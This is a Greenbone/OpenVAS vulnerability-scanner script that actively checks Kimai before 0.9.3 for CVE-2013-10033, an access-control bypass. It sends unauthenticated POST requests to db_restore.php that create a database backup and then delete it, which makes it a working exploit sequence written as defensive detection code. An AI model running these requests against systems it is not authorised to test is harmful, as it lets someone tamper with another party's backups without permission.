# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903512");
  script_version("2025-08-07T05:44:51+0000");
  script_tag(name:"last_modification", value:"2025-08-07 05:44:51 +0000 (Thu, 07 Aug 2025)");
  script_tag(name:"creation_date", value:"2014-02-25 11:03:19 +0530 (Tue, 25 Feb 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2013-10033");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Kimai < 0.9.3 Security Bypass Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Kimai is prone to a security bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an improper restricting access to
  'db_restore.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to conduct
  certain backup and restore operations.");

  script_tag(name:"affected", value:"Kimai version 0.9.2.1306 and prior.");

  script_tag(name:"solution", value:"Update to version 0.9.3 or later.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20140724092729/http://secunia.com/advisories/53390/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/25606");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/30010");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

kimPort = http_get_port(default:80);

if(!http_can_host_php(port:kimPort)){
  exit(0);
}

host = http_host_name(port:kimPort);

foreach dir (make_list_unique("/", "/kimai", http_cgi_dirs(port:kimPort)))
{

  if(dir == "/")
    dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:kimPort);

  if("Kimai Login<" >< rcvRes && "kimaiusername" >< rcvRes)
  {
    ## Backup Creation request
    postdata = "submit=create+backup";
    sndReq = string("POST ", dir, "/db_restore.php HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n\r\n",
                     postdata);

    ## Send request to create a back-up and get back-up id
    rcvRes = http_keepalive_send_recv(port:kimPort, data:sndReq);

    backId = eregmatch(pattern:"name=.dates.*value=.([0-9]+).", string:rcvRes);
    if(backId[1])
    {
      ## Create a Backup deletion request
      postdata = "dates%5B%5D=" + backId[1] + "&submit=delete";

      sndReq = string("POST ", dir, "/db_restore.php HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(postdata), "\r\n\r\n",
                      postdata);

      rcvRes = http_keepalive_send_recv(port:kimPort, data:sndReq);

      if(backId[1] >!< rcvRes && "create backup" >< rcvRes &&
        "!-- delete -->" >< rcvRes)
      {
        security_message(port:kimPort);
        exit(0);
      }
    }
  }
}

exit(99);
